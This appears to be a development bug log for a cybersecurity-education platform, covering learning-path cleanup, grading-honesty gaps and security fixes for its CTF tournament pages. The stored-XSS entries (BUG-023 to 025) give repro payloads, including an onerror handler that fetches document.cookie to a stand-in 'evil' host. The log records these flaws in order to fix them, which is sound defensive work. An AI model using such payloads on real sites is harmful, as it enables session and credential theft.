- **CySA tangle (must be ruled TOGETHER, not per-row):** LearningPaths has THREE CySA-adjacent ids: `cysa` (LearningPaths.js:3240) and `cysa-plus` (:4624) share the IDENTICAL `courseHref: 'houses/eye/cysa/index.html'` (one is likely a dead duplicate definition, not a distinct path); `eye-cysa` is the HubRegistry hub for that same page. Both `cysa` and `cysa-plus` are orphaned and both map to house eye in PATH_HOUSE_MAP. Ruling should pick ONE canonical CySA path id (or retire the paths in favor of the hub) and say what happens to progress under the losing id(s).
- **CORRECTION 2026-07-28 -- most of this entry was WRONG, and the correction is the finding.**
  The table above has 12 rows / 10 unique path ids. Re-verified per row (does a hub page render
  that path?): 9 of the 10 unique ids are NOT orphaned. Their "thin cert stub" hub pages are
  literally `CertPathRenderer.init('<same-id>')` -- the hub cartridge students click RENDERS THE
  PATH. Verified for aws-ccp, azure-fundamentals, devops-fundamentals, aws-developer,
  security-operations, cryptography-track, security-plus-crypto, comptia-linux, casp-plus. I
  filed those as orphans after judging the pages by file size (1KB) without reading what they do.
- **The 10th (cysa-plus) was not collateral damage either -- it was a deliberate retirement.**
  Commit 35fef0307 (2026-07-27, "promote 2 dedicated cert courses to canonical, retire 2 thin
  stubs") removed cysa-plus from HubRegistry AND firestore.rules to hold 142/142 parity, and
  meta-refreshed its page to the canonical 16-chapter course at /houses/eye/cysa/. My proposed
  fix (resurface it as a card) would have reversed that ruling a day later. Caught by Nancy.
- **CONTENT VERIFICATION (the operator asked: is it truly a duplicate, or is there anything to
  save?):** `cysa` 32 modules -- 100% presented by the canonical hub page, ZERO unique content.
  `cysa-plus` 21 modules -- shares ZERO modules with cysa (two different courses that happened to
  share a name and courseHref); all 21 files remain reachable, 12 through other path definitions
  and 9 through ContentCatalog house browsing. No content was at risk under either option; what
  ended is an ordered sequence.
- **RULING + RESOLUTION (operator: "retire both, archive first"):** both path definitions removed
  from LearningPaths.js and their PATH_HOUSE_MAP entries from handler-dashboard.js, after being
  archived verbatim with restore instructions to
  `_archive/cysa-learning-paths-retired-2026-07-28/LearningPaths-cysa-blocks.js` (53 module hrefs
  captured = 32 + 21). Note there was no prior convention for archiving a LearningPaths
  retirement -- 35fef0307 archived nothing -- so this establishes the pattern rather than
  following one.
- **Deliberately NOT changed:** the 49 `paths: ['cysa']` tags in _app/config/content-registry.js.
  That is a separate CERTIFICATION tag read only by terminal.html's cert filter (:1109-1110,
  :1310), which never consults LearningPaths; `ContentRegistry.paths` (the map InstructorDashboard
  reads) is a different top-level structure with no cysa key. Same for the cert ids in pulse.html,
  cert-alignment.js, ForensicsEngine.js and dashboard.html -- all carry their own local data and
  none call LearningPaths.
- **MEASURED SIDE EFFECT (Nancy's condition, before/after run):** strict-orphan-scanner orphans
  727 -> 768 (+41), mechanism2_learningPathModules 664 -> 623. Split, verified by diffing the
  reports: 32 are the eye-cysa chapter modules, which the canonical hub page DOES present -- a
  scanner blind spot, because that page is hand-authored, never matches HUB_SIGNATURE_RE, and uses
  abbreviated data-module values (taskboard #238, with a fix direction). The other 9 looked like a TRUE finding and were reported that way; CORRECTED
  2026-07-28 after Nancy pushed back: only TWO of them (shield-cve-lookup, shield-cysa-toolkit)
  are genuinely uncurated. The other seven -- cyberops-{attack-surface-vuln, cvss-terminology,
  evidence-types, irp-elements, nist-800-86, risk-rating, soc-metrics} -- are linked from the
  hand-authored CyberOps weekly curriculum pages (week1/2/3/5 under
  _app/houses/eye/applets/cyberops/), which the scanner cannot see for exactly the reason
  taskboard #238 exists. So the honest cost of retiring the aggregate is 2 modules, not 9. The content is
  live and browsable either way.
- **Root cause:** ec74ee454 swapped card SHAPE (object with path-view link -> registry string with hub link) without checking whether the removed links were the only route to real LearningPaths content. Same commit-class as BUG-037.
- **NOT auto-fixed because:** restoring the cards wholesale would render two near-identical cards per pair (path + hub, same name) to different destinations -- a UX defect; and hub-vs-path canonicality is an operator ruling. The AI house's 3 paths were restored in b92534ad7 because they had NO hub twins (zero collision); every row above except security-plus-crypto has a twin.
- **Fix:** pending Frank's per-pair rulings; ships as its own change with the usual QC chain.
- **Related:** BUG-037 (same origin commit), hub-registry-audit "carded outside their registry house" WARN (added with the Eye projection; overlaps 4 rows above).

### BUG-036 — eye-osint-dashboard.html: unescaped HTML inside a code sample pollutes the live DOM  ·  P2  ·  open
- **Found:** 2026-07-28 · by Nancy · during SEM-002 marathon review (misclassified as a heading-count issue until she traced it)
- **Area:** _app/projects/eye-osint-dashboard.html:1306-1339+ — a Python triple-quoted Flask template shown as example code inside `<div class="cf-code">` is NOT entity-escaped
- **Symptom:** the browser parses the sample's raw `<html>/<head>/<meta>/<title>/<style>/<h1>` into REAL DOM nodes mid-body; the leaked `<style>` rules (`h1{color:#c084fc}`, `.card{}`, `form input[type=text]{}`) apply document-wide. No visible breakage TODAY only because `.cf-subject` outranks the bare h1 rule and no `.card`/form collisions exist on the page — one selector collision away from visible corruption.
- **Fix (correct):** HTML-entity-escape the code sample (`&lt;`). Do NOT "fix" by demoting an h1 — that treats the SEM-002 symptom and leaves the parser pollution.
- **Related:** SEM-002 marathon round 3 (this page was its 1 MANUAL item — reclassified here).

### BUG-035 — PIS written final credited the PRACTICAL final's progress module  ·  P1  ·  fixed-not-deployed
- **Found:** 2026-07-28 · by Nancy · during marathon catalog-declaration review (her rescan surfaced the CAT-007 dup that unraveled it)
- **Area:** _app/houses/shield/infosec/exams/pis-final.exam.html:621 + ContentCatalog.js pis-final/pis-final-practical entries
- **Symptom:** The written final called `ModuleProgress.completeQuiz('shield', 'pis-final', ...)` — but the hub's `data-module="pis-final"` card is the PRACTICAL (Patient Zero). Passing the written exam marked the practical complete; the written card (`pis-final-written`) never completed. Catalog compounded it: `pis-final` entry pointed at the written exam file while `pis-final-practical` (an id used by zero cards and zero progress writes) pointed at the practical.
- **Fix:** exam file now completes `'pis-final-written'` (its own card id); catalog `pis-final` re-pointed to the practical lab (matching its hub card); duplicate `pis-final-practical` entry removed (grep-verified zero refs); `pis-final-written` declared with the correct exam href.
- **CAVEAT (historical data):** students who passed the written final before this fix have `pis-final` (practical) marked complete and no `pis-final-written` record. Cannot distinguish them from genuine practical completions retroactively — historical completions left as-is; instructors should treat pre-2026-07-28 `pis-final` completions as ambiguous.
- **Verified:** rescan pending in marathon batch; deploy pending.

### BUG-034 — path-view.html renders any learning path with zero access gating  ·  P2  ·  open
- **Found:** 2026-07-28 · by Nancy · during workshop-quarantine review of security-plus-crypto
- **Area:** _app/path-view.html — no AccessGuard reference anywhere in the file
- **Symptom:** `/path-view.html?path=<id>` renders the full module list of ANY LearningPaths path directly from the URL — no sorted gate, no tourist limits, and (until the workshop bundle ships) no way to quarantine a path from it. Unsorted visitors and old links reach path content that page-level gates elsewhere would block.
- **Root cause:** page predates/skipped the AccessGuard convention; it renders LearningPaths.PATHS[lookupId] with no auth check (path-view.html:395).
- **Fix:** PARTIAL in workshop bundle (workshop-status paths get an admin gate inside path-view; handler-dashboard Course Browser filters workshop paths at all 3 exposure points — Chris QC catch). The general no-gate-at-all exposure is NOT fixed there (scope) — needs its own ruling: add `AccessGuard.require('sorted')` like every course page, or deliberate decision that path browsing is public.
- **RESIDUAL (recorded, by design):** `LearningPaths.PATHS` itself carries NO quarantine marker — every fix lives in downstream consumers (catalog, path-view, handler-dashboard, hub page). Any FUTURE code that reads LearningPaths.PATHS directly inherits the leak. Root fix = the unified-registry migration (consumers resolve through HubRegistry, which carries status) — see `_docs/architecture/unified-hub-registry.md`. Until then, any new LearningPaths consumer MUST apply the workshop-status filter.
- **Related:** BUG-033 workshop-quarantine bundle (security-plus-crypto).

### BUG-032 — FEH dashboard cards linked to the Forensics Hub, not the FEH course  ·  P2  ·  fixed-not-deployed
- **Found:** 2026-07-27 · by Chris + Nancy · in cartridge-fy / FEH-rename QC
- **Area:** _app/tenant/{index,dashboard-clean-ops,dashboard-command-center,dashboard-enterprise,dashboard-tactical-hud}.html — 6 `feh` entries
- **Symptom:** 6 tenant-dashboard "FEH" cards `href`'d to `/houses/eye/forensics/` (Digital Forensics Hub, 60-module unrelated course) instead of the FEH course. Surfaced when the label was corrected to "Foundations of Ethical Hacking" (was masked while the label wrongly said "Forensics & Ethical Hacking").
- **Root cause:** whoever authored these read FEH as "Forensics", so both mislabeled AND mis-linked it to the forensics hub.
- **Fix:** feh-name-rename commit — 6 hrefs → `/houses/dark-arts/feh/index.html` (only lines containing `'feh'`; forensics-hub entries untouched).
- **Verified:** grep 0 remaining feh→forensics; div balance intact on all 5 files; target page exists.
- **Related:** the coordinated FEH rename (14 files); the hardcoded-consumer-name disease that motivates the registry-source migration (option C).

_From the 2026-07-21 verify-first triage of the marathon backlog (38 items → 14 real). P2s logged individually; the P3 tail is one cluster entry. Resolved/not-a-bug items were cleaned from the marathon backlog, not re-filed here._

### BUG-031 — cert-prep hub-inventory reconciliation can't see redirects; A+ stubs flagged unregistered forever  ·  P3  ·  open
- **Found:** 2026-07-26 · by Nancy (cert-prep catalog review) · Option A cert-prep increment
- **Area:** `_tools/eduscan/gen-hub-inventory.js` reconciliation (exact-hubHref match) vs `_app/houses/aplus-core1/index.html` + `aplus-core2` (self-redirect stubs to the deep applet pages).
- **Symptom:** registered `aplus-core1`/`aplus-core2` point at the deep applet pages; the `/houses/aplus-core1|2/` stubs self-redirect there (so no live content split), BUT the inventory generator matches by exact href and doesn't understand redirects, so it permanently reports those two stub pages as unregistered cert-prep pages, residual noise by construction.
- **Repro:** `hub-inventory.json` -> aplus-core1/2 stub pages show `inRegistry:false`.
- **Fix:** not yet — either teach the generator to follow meta-refresh/location.replace redirects, or repoint the registry aplus-core1/2 hubHref to the `/houses/aplus-core1|2/` stubs (canonical=stub, the deferred dedup), or accept + document the residual.
- **Related:** BUG-030; the deferred A+ dedup (Option B canonical=stub).

### BUG-030 — two live Network+ experiences: registered `network-plus` vs unregistered `/houses/comptia-network/`  ·  P2  ·  open
- **Found:** 2026-07-26 · by Nancy (cert-prep catalog review) · Option A cert-prep increment
- **Area:** `_app/houses/comptia-network/index.html` (live CertPathRenderer Network+ page, unregistered) vs registry `network-plus` -> `/houses/web/network-plus/index.html` (separate, larger hand-built page; `LearningPaths.js` has a distinct `comptia-network` key, zero `network-plus`).
- **Symptom:** two different Network+ (N10-009) experiences exist in production, one licensable (network-plus), one not (comptia-network). A student reaching `/houses/comptia-network/` via search or the inventory gets a different, unlicensed experience for a cert a tenant may have paid for. Not double-registered by the cert-prep increment (intentional), so `comptia-network` stays an unregistered duplicate.
- **Repro:** both pages load; only network-plus is in the registry.
- **Fix:** not yet — decide the canonical Network+ page, consolidate/redirect the other, then register one. Needs an owner (content decision).
- **Related:** BUG-031; the parallel-hub-systems consolidation (LearningPaths/CertPathRenderer vs HubRegistry).

### BUG-029 — ForensicsEngine.js links to the deprecated `/houses/security-plus/` redirect stub  ·  P3  ·  open
- **Found:** 2026-07-26 · by Nancy (registry href-cleanup review) · Option B stage 1
- **Area:** `_app/components/ForensicsEngine.js:296` links to `/houses/security-plus/index.html` (a redirect stub -> `/houses/shield/security-plus/`).
- **Symptom:** works today (stub redirects), but the stub cannot be safely deleted while this live inbound reference survives. HubRegistry + lobby now route around the stub (point directly at `/houses/shield/security-plus/`); this is the last known consumer still pointing AT the stub.
- **Repro:** grep `_app` for `/houses/security-plus/` -> ForensicsEngine.js:296 is the straggler.
- **Root cause:** the real Security+ hub moved to `/houses/shield/security-plus/`; the stub was left as a redirect and this reference never updated.
- **Fix:** not yet — repoint ForensicsEngine.js:296 to `/houses/shield/security-plus/index.html`, THEN the stub can be archived. Bundled out of the registry-cleanup change to keep it scoped.
- **Verified:** N/A (open).
- **Related:** Option B registry-href cleanup (this session); the also-open task of making lobby.html read hub links from HubRegistry instead of its duplicate COURSE_MAP (the root duplication that keeps causing these).

### BUG-028 — lobby.html hardcodes the same dead CyberOps path (`/houses/eye/cyberops/`)  ·  P2  ·  RESOLVED — deployed + live-verified 2026-07-26 (c7a5a4947)
- **Found:** 2026-07-25 · by Nancy (catalog.html deploy review) · cover-cartridge bundle
- **Area:** `_app/lobby.html:644` (`'cyberops': { ... href: '/houses/eye/cyberops/' }`).
- **Symptom:** the CyberOps course link in the lobby 404s; the real page is `/houses/eye/modules/cyberops/index.html`. Clicking CyberOps from the lobby lands on a 404.
- **Repro:** open `/lobby.html`, click the CyberOps card → 404.
- **Root cause:** pre-existing hardcoded path, duplicated from the same wrong value that was in `HubRegistry.js:112` (fixed this session). lobby.html maintains its own hub map instead of reading the registry, so the registry fix does not cover it.
- **Fix:** `c7a5a4947` (2026-07-26) — lobby.html:644 href corrected to `/houses/eye/modules/cyberops/index.html`. Chris PASS, deployed. Longer-term (still open, separate): lobby.html should source hub links from HubRegistry rather than duplicate them.
- **Verified:** live on hexworth.com/lobby.html (serves the corrected href; old `/houses/eye/cyberops/` gone; target 200).
- **Related:** cover-cartridge bundle; `HubRegistry.js` cyberops hubHref fix (this session).

### BUG-027 — hub-registry-audit Part C (dynamic-hub checks) never executes in a bare `./deploy.sh` run  ·  P2  ·  open
- **Found:** 2026-07-25 · by Nancy (hub-health re-review) · cover-cartridge hub-health session
- **Area:** `_tools/eduscan/hub-registry-audit.js:133` (`require('firebase-admin')`) invoked as `node _tools/eduscan/hub-registry-audit.js` from `deploy.sh` Gate 2.5.
- **Symptom:** `firebase-admin` only lives in `functions/node_modules`, which Node's module resolution won't reach from `_tools/eduscan/`. So the require throws `Cannot find module 'firebase-admin'`, the whole async Part C is caught and WARN-skipped, and its three dynamic-hub gate checks never run at deploy time: the cross-existence orphan-cover FAIL, the dynamic-id-vs-static collision FAIL, and the published-dynamic-hub-with-no-cover WARN. The gate's protection for dynamic hubs is therefore theoretical in a bare deploy.
- **Repro:** `node _tools/eduscan/hub-registry-audit.js` → observe `WARN Firestore validation skipped (... Cannot find module 'firebase-admin')`.
- **Root cause:** PRE-EXISTING (commit `46a4958f5`, the original step-5 audit); predates the 2026-07-25 hub-health patch. Also requires ADC/creds even once the module resolves.
- **Fix:** not yet — options: (a) install/symlink `firebase-admin` resolvable from `_tools/eduscan/`, or (b) run the audit with an explicit `NODE_PATH`/require path + creds in the deploy env, or (c) document Part C as a credentialed-only pass. Decide with Frank.
- **Verified:** N/A (open). Working fallback in the meantime: the admin **Hub Health** panel runs the same reconciliation live via the client SDK (no firebase-admin).
- **Related:** cover-cartridge system (`_docs/operations/hub-cover-cartridge-plan.md`); hub scaffolder task #225.

### BUG-026 — CTF team self-join is blocked by the update rule (captain-gated, but captain is always null)  ·  P2  ·  RESOLVED — CFs deployed + live 2026-07-25 (end-to-end browser join test pending)
- **Found:** 2026-07-24 · by self (BUG-024 flow investigation) · marathon
- **Area:** `firestore.rules:788` update rule (`resource.data.captain == request.auth.uid || isAdmin()`) vs `_app/arena/tournament-lobby.html:509` `joinTeam` client `update({ members: arrayUnion(uid), memberNames: arrayUnion(name) })`.
- **Symptom:** the lobby "Join Team" button performs a client-side team update to add the student to `members`, but the update rule only permits the team `captain` (a field that is ALWAYS null — never set anywhere) or an admin. There is no join Cloud Function. So a non-admin clicking "Join Team" gets `permission-denied`; self-join is broken, teams can only be populated by an admin.
- **Repro:** as a non-admin, open a tournament lobby, click Join Team → PERMISSION_DENIED in console; membership does not change.
- **Root cause:** the update rule was written for a captain-managed model, but no code ever assigns a captain and the join UI assumes self-service.
- **Fix:** teams are admin-write-only at the rules layer (BUG-024); self-join/leave is delivered by two NEW Cloud Functions `ctfJoinTeam` / `ctfLeaveTeam` (admin SDK, bypassing rules) that validate the op server-side. Auth, id-format (slug regex), tournament status, and a first-pass one-team scan run before the transaction; the team-full check, the roster mutation, and the one-team enforcement run INSIDE `db.runTransaction`, which serializes on a per-user `rosterLocks/{uid}` doc (one lock = one team claim, so concurrent joins to different teams cannot flood rosters) and keeps `members[]`/`memberNames[]` INDEX-ALIGNED (push/splice both together), binding each name to its uid with no schema change. The lobby's `joinTeam`/`leaveTeam` now call these CFs instead of a client `.update()`. A client-side self-join RULE was rejected: adversarial review proved it cannot secure the parallel arrays (a self-leaver could drop a teammate's name; a name-change causes leave-lockout). Ships TOGETHER with the BUG-024 rule + the lobby change so self-join goes broken→working with no gap.
- **Verified:** flows grepped (client self-join was empirically DENIED under the old rule via the emulator — advertised-but-broken, so the CF is the enabler not a regression fix); `functions/index.js` `node --check` clean; Nancy reviewed the CFs (id-validation + leave-misalignment guard added on her catch). Deploy = functions + firestore:rules + hosting together.
- **Related:** BUG-024 (same rules change); tournament-lobby.html self-join flow.

### BUG-025 — `tournament-lobby.html` puts the attacker-chosen team **doc id** into an onclick → live zero-click stored XSS  ·  P1  ·  RESOLVED — client fix deployed 2026-07-24 (8994812ff); root closed by BUG-024 (crafted doc id can no longer be created)
- **Found:** 2026-07-24 · by Nancy (final XSS sweep of the tournament pages) · during the BUG-023 hardening pass
- **Area:** `_app/arena/tournament-lobby.html:621,625` — `onclick="leaveTeam('" + team.id + "')"` / `joinTeam('" + team.id + "')"`, built into a string later assigned to `container.innerHTML`.
- **Symptom:** the MOST SEVERE instance of the crafted-team-field class. `team.id` is the Firestore **document id**, and `teams.create` (firestore.rules:787) lets any authenticated user CHOOSE the id with no format constraint. A team created with id `x"><img src=x onerror=…>` closes the `onclick` attribute and the `<button>`, then injects a self-contained `<img onerror>` that executes **on page render — zero clicks required** — in the browser of every visitor (student / instructor / admin) to `tournament-lobby.html?id=<tid>`, for as long as that team doc exists. Script execution (session/credential theft), not mere defacement.
- **Repro:** authed devtools: `firebase.firestore().doc('tournaments/<tid>/teams/x"><img src=x onerror=alert(document.domain)>').set({name:'x', members:[myUid], captain:myUid})`, then open that tournament's lobby.
- **Root cause:** the doc id was treated as trusted; field-name-scoped hardening never considered `id` (it is not a document "field"). Enabled by BUG-024 (attacker-chosen id + no validation).
- **Fix:** `const safeId = /^[A-Za-z0-9_-]{1,128}$/.test(team.id) ? team.id : '';` — join/leave buttons render only when `safeId` is truthy and interpolate `safeId` (a crafted id yields no button, and the anchored slug charset cannot contain a quote or angle bracket). Legit Firestore auto-ids and admin slugs (`team-red`) match the regex, so no legit regression. Rides the arena XSS-hardening deploy.
- **Verified:** grep-clean (no raw `team.id` in any onclick); Nancy final sweep independently walked every sink → PROCEED; extracted-script `node --check` OK; lobby div balance 28/28.
- **Related:** BUG-023 (same class, same hardening pass), BUG-024 (root cause — the durable fix constrains the team doc-id FORMAT in `firestore.rules`, not just field types).

### BUG-024 — `tournaments/*/teams` create/update open to any authed user (crafted fields + crafted doc id)  ·  P1  ·  RESOLVED — deployed + live-verified 2026-07-25 (rules + CFs live, lobby byte-identical)
- **Found:** 2026-07-24 · by Nancy (adversarial review of broadcast.html Phase A) · tournament broadcast build
- **Area:** `firestore.rules:787` — `match /teams/{teamId} { allow create: if request.auth != null; ... }`
- **Symptom:** any authenticated user (any student) can create a team doc in ANY tournament with arbitrary fields of arbitrary types — e.g. `score` as an HTML/JS string instead of a number, or a `color` carrying a CSS payload. Because `teams` read is public (`allow read: if true`) and every standings surface (podium, broadcast, admin) renders these fields, a malicious value becomes a stored-XSS / defacement vector on high-visibility screens (see BUG-023). `update` is effectively locked (captain is a dead null field + isAdmin) but `create` is wide open, so an attacker needs no update access.
- **Repro:** from devtools on any authed page: `firebase.firestore().collection('tournaments/<id>/teams').add({name:'x', score:'<img src=x onerror=...>'})`.
- **Root cause:** the create rule authenticates the writer but does not constrain the document shape (no `request.resource.data.score is number`, no field whitelist, no team-membership / tournament-state check).
- **Fix:** `firestore.rules` teams block locked to admin: `create: isAdmin()` + `update: isAdmin()` (dropped the dead `captain` clause). Since team creation only happens inside the isAdmin-gated tournament-creation flow, and score/solves updates come from `ctfSubmitFlag` via the admin SDK (bypasses rules), this closes the crafted-team / crafted-doc-id XSS+DoS class at the SOURCE with zero legit regression — the client-side hardening (BUG-023/025) becomes defense-in-depth. Model B student self-join is NOT enabled by a client rule (adversarial review proved a rule cannot secure the parallel `members[]`/`memberNames[]` arrays — a self-leaver could drop a teammate's name; name-change causes leave-lockout); it is delivered separately via a `ctfJoinTeam`/`ctfLeaveTeam` Cloud Function (BUG-026). **Emulator-tested** (`_tools/rules-test/teams-rules.test.js`, 14/14 via `@firebase/rules-unit-testing`): student create DENY (incl. crafted doc id), admin create ALLOW, student self-join/tamper/other-member/unauth DENY, admin update ALLOW, rosterLocks CF-only. The CFs are separately concurrency-tested (`_tools/rules-test/ctf-join-concurrency.test.js`, 10/10 against the functions+firestore+auth emulators): 5 concurrent joins by one uid -> EXACTLY ONE wins + 4 rejected (roster-lock serialization blocks team-flooding), leave releases the lock, stranded-lock recovery after team-delete, team-full rejected, leave-never-joined rejected.
- **Verified:** flows grepped (only-admin creates teams; no user create-team UI; after the lobby rewire ZERO non-admin client team-writes remain in `_app`); prod read = 1 tournament / 6 teams, all admin-slug ids, members/memberNames aligned, 0 malformed. Nancy 4 rounds (all findings fixed: memberNames binding, id-format validation, tournament-wide flooding race, orphaned/stranded lock, doc accuracy, response-shape). Chris PASS (independently re-ran 14/14 + 10/10, reproduced the old-rule "self-join already denied" check, own prod read, own consumer grep). Deploy = functions + firestore:rules + hosting together.
- **Verified:** rule read directly (`firestore.rules:786-788`).
- **Related:** BUG-023 (the render-side XSS this enables); broadcast.html Phase A (defended client-side).

### BUG-023 — crafted team fields render unsafely across the tournament pages (stored XSS / DoS class)  ·  P1  ·  RESOLVED — 3 public pages deployed 2026-07-24 (8994812ff); admin/CtfStandings residual closed at source by BUG-024 (no crafted team can be created)
- **Found:** 2026-07-24 · by Nancy (adversarial review of broadcast.html Phase A) · tournament broadcast build
- **Area:** `_app/arena/tournament-podium.html:433` and `:450` — `(t.score || 0)` interpolated into innerHTML with no escape/coercion.
- **Symptom:** a team whose `score` field is an HTML string (writable via BUG-024) executes script in the browser of anyone viewing the podium — including a projected screen at a live event, the highest-value defacement target on the platform. The same pattern would have shipped in broadcast.html (3 render paths) but was coerced before commit.
- **Repro:** create a team with `score` = `<img src=x onerror=fetch('//evil/'+document.cookie)>` (via BUG-024), open the podium for that tournament.
- **Root cause:** numeric field assumed numeric and interpolated raw; every text field on the page is escaped but the numerics are not.
- **Fix:** hardened all 3 PUBLIC arena render surfaces this session (pending deploy): **podium** (score→`num()`, color→`safeColor()` hex-whitelist, solves→`Array.isArray`, lastSolveTime+startTime `.toDate()`→`typeof==='function'` guard); **broadcast.html** (score/points→`num()`, color→`sanitizeColor()`, all 3 solves.length→`Array.isArray`, lastSolveLabel+startTime toDate-guard); **lobby** (color→inline hex-whitelist, memberCount+members×3→`Array.isArray`, status→validated class + `escHtml`, tournamentId→`encodeURIComponent` in hrefs, and team.id→onclick→`safeId` slug-validate [broken out as **BUG-025**, the most severe]). All static coercion/validation, no legit-render regression (real hex/auto-ids/Timestamps/arrays all preserved). Adversarial review CONVERGED over 6+ rounds (found a new sink each round — all fixed) → final sweep PROCEED. Chris gate + deploy pending.
- **Deferred (same class, to be closed at the source by the BUG-024 rules root-fix):** `_app/admin/console.html` renderCtfTeams (same pattern, admin-gated) and `_app/components/CtfStandings.js` `rankTeams()` (a crafted non-numeric score NaN-corrupts the sort BEFORE display → wrong standings order → wrong-place credential). Non-blocking consistency tail also logged: self-only truncated `initials`, admin-only `duration`/`maxTeamSize`/`ch.points`, and a harmless `state.challenges['__proto__']` lookup (wrong-title-only, still `esc()`'d).
- **Verified:** all 3 files grep-clean of attacker-reachable raw interpolation; extracted-script `node --check` OK on each; lobby div balance 28/28; Nancy final sweep walked every `innerHTML`/`html +=`/attribute/handler sink to its source.
- **Related:** BUG-024 (root enabler — the durable fix, constrains team field types + doc-id format in rules); BUG-025 (team.id onclick stored XSS, most severe instance); broadcast.html Phase A.

### BUG-022 — CTF tournament standings have no tie-break; positions can be wrong on score ties  ·  P1  ·  RESOLVED (deployed + live-verified 2026-07-24)
- **Found:** 2026-07-24 · by self · during HCA (Hexworth Credential Authority) design — grounding the credential design in the live tournament that feeds it
- **Area:** `_app/arena/tournament-podium.html` (canonical standings surface): teams pulled via `.collection('teams').orderBy('score', 'desc')` (line ~351); `renderLeaderboard()` (line 357) ranks purely by that array order (`rank = i + 1`, `top3 = teams.slice(0,3)`).
- **Symptom:** two teams tied on `score` are ordered by Firestore's implicit `__name__` (document-id) tiebreak, which is meaningless for standings. The wrong team can take a podium slot / higher rank. Because HCA credentials and position trophies mint FROM these positions, a tie would produce a wrong-place trophy or credential. Competitive-integrity + credential-integrity defect (garbage-in-garbage-out for the credential layer).
- **Repro:** two teams reach the same score; the one whose document id sorts lower wins the higher position regardless of who reached the score first.
- **Root cause:** ranking uses a single sort key (`score desc`) with no secondary tiebreak. The correct CTF rule is **score DESC, then earliest `lastSolveTime` ASC** (the team that reached a given score FIRST outranks a later team at the same score). `lastSolveTime` already exists on every team doc and is even displayed in the table (line ~419) but is not used to rank.
- **Rule verified (by tracing, not assumed):** `lastSolveTime` is written via `FieldValue.serverTimestamp()` on every correct submission alongside `score += pointsAwarded` (`functions/index.js:6570-6574`), so it always marks when a team last changed its score. No hint-cost/penalty field competes for the tiebreak; no manual score-edit path can create a nonzero tie without a `lastSolveTime`. So earliest-`lastSolveTime`-at-equal-score genuinely means reached-the-score-first. (Nancy R1 confirmed.)
- **Fix (Nancy R2 pending):** defined the rule ONCE in a shared helper `_app/components/CtfStandings.js` — `rankTeams()`: score DESC, then earliest `lastSolveTime` ASC, missing-time-last, id fallback for stable re-renders; NaN-safe (compares equality before subtracting so `Infinity - Infinity` in the all-zero pre-solve state can't corrupt `Array.sort` — Nancy R1 catch). Applied to ALL FOUR consumers so they can't diverge: (1) `tournament-podium.html` (student podium, + removed dead `podiumOrder`/`2<3?3:3` code), (2) `admin/console.html` `renderCtfTeams` (instructor view — makes its existing "earliest lastSolveTime wins" tooltip at :3974 actually true), (3) `admin/console.html` `ctfExport` — **the standings-OF-RECORD export `ctf-results-<id>.json` that feeds HCA credential issuance**; it baked a wrong `rank` into each record on ties, and did not include team id; now ranked via the helper + includes id (found by Nancy R2 Q3, the most credential-critical surface, missed in the first pass), (4) Discord `/standings` in `functions/index.js` (server-side mirror; widened `.limit(10)` → fetch-all-then-slice so a boundary tie can't drop the right team; the server rule is the reference the HCA finalization service reuses). Nancy R2 PROCEED. R2 refinements: `solveMs` guards `v == null` only (a literal `0` epoch-ms is a real time, not "missing"); Discord id-fallback `|| ''` guard added for byte-parity with the helper. **Intentional duplication note:** the server rule in `functions/index.js` is a hand-kept BYTE-IDENTICAL copy of `_app/components/CtfStandings.js` because Cloud Functions bundle only `functions/` and cannot import from `_app/`; comment flags "edit both." DISPLAY/export fix only; the credential-of-record position still requires a frozen tie-broken snapshot at `ended` (HCA finalization — open question 1). Rides next hosting deploy (podium + admin + helper) + functions deploy (Discord).
- **Verified:** unit tests 12/12 (comparator incl. NaN/Timestamp/`{seconds}`/numeric-0/ISO-epoch/missing/stability/purity); syntax clean on all 4 files; Nancy R2 independently traced NaN-gone + podium/admin identical order + load-order race-free + Discord bounded by `maxTeams`. Live browser + deploy verification pending.
- **Scope confirmed complete:** other `teams` touchers are NOT standings-ranking — `tournament-lobby.html:462` sorts by `name` (team-join UI), `tournament-board.html` links out to the podium. No other export/CSV/report surface ranks teams (grepped).
- **Chris PASS** on the fix (independently re-derived: NaN gone, all 4 surfaces converged, write-path traced, no surface missed). Regression suite persisted at `_app/components/CtfStandings.test.js` (19/19, `node` it; exits non-zero on fail).
- **DEPLOYED + live-verified 2026-07-24:** hosting deploy 7/7 gates green (commit 0651b38ad); `/components/CtfStandings.js` served live and byte-identical (md5) to the committed helper; podium + admin console reference it live. Functions deploy: `discordInteraction` "Successful update operation", endpoint alive (405 to GET, POST-only). Tie-order behavior is proven by the regression suite (the surfaces are client-rendered from Firestore, so a live tie can't be browser-reproduced from CLI; production is confirmed serving the fixed code). **Residual open (separate, tracked in HCA design open Q1):** the credential-of-record still needs a frozen tie-broken finalization snapshot at `ended` (HCA finalization service, not built).
- **Related:** HCA design (`_docs/architecture/hexworth-credential-authority.md`, open question 1 — results finalization + trust boundary); part of the "fix the trophies for positions" tournament-structure work.

### BUG-021 — Armory: 150 modules credit completion without any demonstrated work  ·  P1  ·  fix complete + Chris PASS (awaiting deploy auth)
- **Found:** 2026-07-24 · by self (task 103 grading-honesty audit, exhaustive ~215 files) · marathon session
- **Area:** `_app/houses/code/armory/**/*.module.html` + `python-graphics/pg-*.html` — 150 files across 3 template families
- **Symptom:** students earn `ModuleProgress.complete('code', <id>)` without demonstrating any work. Three classes: (1) **JavaScript, 10 files** — bare `ModuleProgress.complete(...)` fires ON PAGE LOAD, zero interaction (worst); (2) **C, 10 files** — completion after clicking N "click here when done" task chips, no validation; (3) **scroll-credit, 130 files** — `checkScroll()` credits completion at `scrollTop/docHeight >= 0.999` across 12 languages (assembly/cpp/csharp/go/java/lua-perl-r/php/powershell/python/ruby/rust/swift-kotlin, 10 each) + python-graphics pg-01..10. This inflates progress %, XP, and the Firestore instructor dashboard / tenant class progress — the Evidence layer the Career-OS mission depends on.
- **Repro:** open any flagged module; JS credits on load, scroll modules credit on reaching the bottom, C credits on clicking the chips.
- **Root cause:** per-language module template authored without a completion gate; predates the honest-checkpoint standard.
- **NOT affected (audit-confirmed honest):** `armory/bash/` (10, LinuxTerminal command-gating w/ error-guard) and `armory/sql/` (10, SQLEngine query-gating) are the in-tree GOLD-STANDARD fix pattern; all 43 dark-arts labs (23 linux + 20 ehe) gate on real typed-command/objective engines — the CSE-class defect does NOT exist there.
